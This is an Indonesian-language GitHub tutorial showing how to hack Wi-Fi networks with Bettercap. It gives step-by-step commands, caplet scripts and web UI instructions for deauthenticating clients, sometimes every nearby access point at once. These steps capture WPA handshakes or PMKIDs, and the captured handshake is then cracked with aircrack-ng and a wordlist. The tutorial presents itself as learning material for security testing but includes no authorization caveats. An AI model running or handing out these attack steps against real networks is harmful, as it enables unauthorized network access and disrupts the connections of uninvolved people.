# Hack Wi-Fi Menggunakan Bettercap

![](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/Bettercap/img/bettercap.gif)

## Cara Instal

### Kali Linux/Parrot OS

```
sudo apt-get udpate
sudo apt-get install bettercap bettercap-caplets
```

Cek versi:

```
bettercap -version
```

## Persiapan

Sebelum menggunakan Bettercap, kita harus mengaktifkan mode monitor pada interface dengan menjalankan perintah berikut:

```
sudo airmon-ng check kill
sudo airmon-ng start [INTERFACE]
```
## Mode-Mode Bettercap

Bettercap memiliki tiga mode operasi utama yang memudahkan pengguna dalam pengujian keamanan jaringan, yaitu sebagai berikut:

### 1. Mode Interaktif (Shell Mode)

Mode Interaktif (Shell Mode) di Bettercap adalah cara penggunaan di mana pengguna berinteraksi langsung dengan CLI Bettercap melalui prompt `bettercap >`. Dalam mode ini, semua perintah dijalankan secara manual satu per satu, seperti memulai reconnaissance Wi-Fi, menangkap handshake, melakukan deauthentication, atau serangan lain. Mode ini cocok untuk belajar, eksperimen, dan kontrol penuh terhadap setiap langkah serangan, karena memungkinkan pengguna melihat output real-time dan menyesuaikan strategi secara langsung.

#### 1. Capture Handshake

```
set wifi.interface [INTERFACE]
set wifi.handshakes.file [OUTPUT]
set wifi.handshakes.aggregate false
wifi.recon on
wifi.show
set wifi.assoc.skip [BSSID]
wifi.deauth [BSSID]
```

#### 2. Capture PMKID

```
set wifi.interface [INTERFACE]
set wifi.handshakes.file [OUTPUT]
set wifi.handshakes.aggregate false
wifi.recon on
wifi.show
wifi.assoc [BSSID]
```
### 2. Mode Skrip (Scripting Mode)

Mode Skrip (Scripting Mode) di Bettercap adalah mode yang memungkinkan pengguna untuk menjalankan serangkaian perintah secara otomatis menggunakan file skrip yang disebut caplet (dengan ekstensi `.cap`).

1. Buat caplet dengan nama `script.cap`:

    ```
    nano script.cap
    ```

2. Isi file tersebut dengan sintaks berikut:

    1. Capture Handshake:
   
        ```
        # Script Caplet Bettercap untuk Capture Handshake

        # Tentukan interface Wi-Fi yang digunakan
        set wifi.interface [INTERFACE]

        # Tentukan file output untuk menyimpan handshake
        set wifi.handshakes.file [OUTPUT]

        # Jangan gabungkan semua handshake ke satu file
        set wifi.handshakes.aggregate false

        # Mengaktifkan modul Wi-Fi untuk pemindaian jaringan
        wifi.recon on

        # Menunggu selama 30 detik agar pemindaian berjalan
        sleep 30

        # Lewati Association Request ke semua AP
        set wifi.assoc.skip all

        # Mengirim paket deauthentication ke semua AP untuk menangkap handshake
        wifi.deauth all
        ```

    2. Capture PMKID:
  
        ```
        # Script Caplet Bettercap untuk Capture PMKID

        # Tentukan interface Wi-Fi yang digunakan
        set wifi.interface [INTERFACE]

        # Tentukan file output untuk menyimpan hasil capture
        set wifi.handshakes.file [OUTPUT]

        # Jangan gabungkan semua handshake/PMKID ke satu file
        set wifi.handshakes.aggregate false

        # Mengaktifkan modul Wi-Fi untuk pemindaian jaringan
        wifi.recon on

        # Menunggu selama 30 detik agar pemindaian berjalan
        sleep 30

        # Mengirim Association Request ke semua AP untuk menangkap PMKID
        wifi.assoc all
        ```

3. Jalankan caplet:

    ```
    bettercap -caplet script.cap
    ```
   
### 3. Web UI

Mode Web UI di Bettercap adalah fitur yang memungkinkan pengguna mengontrol Bettercap melalui antarmuka grafis di browser, tanpa harus mengetik perintah di CLI.

1. Jalankan Bettercap dengan web UI aktif:

    ```
    sudo bettercap -caplet http-ui
    ```
   
3. Arahkan kursor ke alamat URL yang terdapat pada bagian `starting on`, yaitu `http://127.0.0.1:80`, lalu klik kanan dan pilih `Open Link`.
   
    ![](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/Bettercap/img/ui%201.png)

4. Masukkan:

    - **Username**: `user`
    - **Password**: `pass`
  
    ![](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/Bettercap/img/ui%202.png)

5. Klik ikon `Wi-Fi` seperti yang ditunjukkan pada gambar di bawah ini:

    ![](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/Bettercap/img/ui3.png)

6. PIlih interface yang ingin digunakan dengan mengklik menu dropdown sepertin yang ada di gambar ini:

    ![](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/Bettercap/img/%20ui%204.png)

7. Lakukan pemindaian (scanning) Wi-Fi dengan mengklik ikon seperti yang ditunjukkan pada gambar ini:

    ![](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/Bettercap/img/ui%205.png)

8. Di gambar ini terdapat beberapa bagian, antara lain:

    ![](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/Bettercap/img/ui%206.png)
   
    - `RSSI`: Menunjukkan kekuatan sinyal dari Access Point (AP) dalam satuan dBm. Semakin tinggi nilainya (mendekati 0), semakin kuat sinyalnya.
    - `ESSID`: Nama jaringan Wi-Fi yang dapat dikenali oleh pengguna.
    - `BSSID`: Alamat MAC unik dari Access Point yang mengidentifikasi perangkat jaringan.
    - `Vendor`: Produsen perangkat Access Point berdasarkan BSSID.
    - `Encryption`: Jenis enkripsi yang digunakan oleh jaringan Wi-Fi, misalnya WEP, WPA, atau WPA2.
    - `Ch`: Kanal (channel) yang digunakan oleh Access Point untuk komunikasi.
    - `Clients`: Jumlah perangkat klien yang saat ini terhubung ke AP tersebut.
    - `Sent`: Jumlah paket data yang dikirim dari perangkat ke AP.
    - `Recvd`: Jumlah paket data yang diterima dari AP oleh perangkat.
    - `Seent`: Menunjukkan jumlah paket yang terdeteksi (seen) dari klien atau AP yang dipantau.
     
9. Di sini, kita harus memilih BSSID yang ingin diserang, lalu mengklik menu dropdownnya:

    ![](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/Bettercap/img/ui%207.png)

    Di sini, kita dapat melakukan dua jenis serangan:

    - Capture Handshake
    - Capture PMKID

    Untuk `Capture Handshake`, klik `Deauthenticate Client`. Untuk `Capture PMKID`, klik `Associate`.

    > **Catatan**:
    > - **Capture Handshake**: Memerlukan setidaknya 1 klien yang aktif.
    > - **Capture PMKID**: Tidak semua router mendukung PMKID.

    Dalam panduan ini, kita akan memilih `Capture Handshake`.

10. Setelah mengklik `Deauthenticate Client`, tunggu hingga handshake berhasil ditangkap. Handshake dianggap berhasil diperoleh apabila muncul ikon `kunci merah` pada bagian `Encryption` dan notifikasi `Captured handshake for station...`, seperti yang ditunjukkan pada gambar di bawah ini:

    ![](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/Bettercap/img/ui%208.png)

11. Klik ikon `Events`, seperti yang ditunjukkan pada gambar di bawah ini:

    ![](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/Bettercap/img/ui%209.png)

12. Klik salah satu dari ketiga item di bagian pesan, seperti yang ditunjukkan pada gambar di bawah ini:

    ![](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/Bettercap/img/ui%2010.png)

13. Dari gambar di bawah ini terlihat bahwa file handshake disimpan di: `/root/bettercap-wifi-handshakes.pcap`.

    ![](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/Bettercap/img/ui%2011.png)

14. Sekarang, setelah handshake berhasil diperoleh, kita akan mencoba crack password menggunakan tool `aircrack-ng`:

    ```
    aircrack-ng -a 2 /root/bettercap-wifi-handshakes.pcap -w /usr/share/wordlists/rockyou.txt
    ```

    **Keterangan:**
    - `aircrack-ng`: aplikasi utama untuk melakukan cracking password Wi-Fi.
    - `-a 2`: opsi untuk menargetkan jaringan WPA/WPA2.
    - `/root/bettercap-wifi-handshakes.pcap`: file hasil capture yang berisi handshake Wi-Fi.
    - `-w`: opsi untuk menentukan wordlist yang akan digunakan.
    - `/usr/share/wordlists/rockyou.txt`: lokasi file wordlist yang ingin digunakan untuk crack password.

    ![](https://github.com/fixploit03/Wi-Fi-Hacking/blob/main/Bettercap/img/ui%2012.png)

    Dari hasil pada gambar di atas, terlihat bahwa password Wi-Fi berhasil ditemukan pada bagian `Key Found`. Passwordnya adalah: `qwerty12345`.

## Kesimpulan untuk Pemula

Bagi pemula, mode `Interaktif (Shell Mode)` atau `UI Mode (Graphical User Interface)` adalah pilihan terbaik.

- Shell Mode memberikan kontrol penuh atas perintah Bettercap, cocok untuk belajar memahami tiap modul dan langkah-langkah pengujian jaringan.
- UI Mode lebih visual dan intuitif, sehingga memudahkan pemula memantau Access Point, klien, dan status serangan tanpa harus menghafal semua perintah.

Sementara Mode `Scripting` lebih cocok bagi pengguna yang sudah berpengalaman atau ingin melakukan otomatisasi skala besar. Oleh karena itu, pemula sebaiknya memulai dari `Shell Mode` untuk memahami konsep dasar, dan dapat beralih ke `UI Mode` agar proses belajar lebih cepat dan mudah dipahami.

**Semoga bermanfaat.**

Salam hormat,
**Rofi (Fixploit03)**
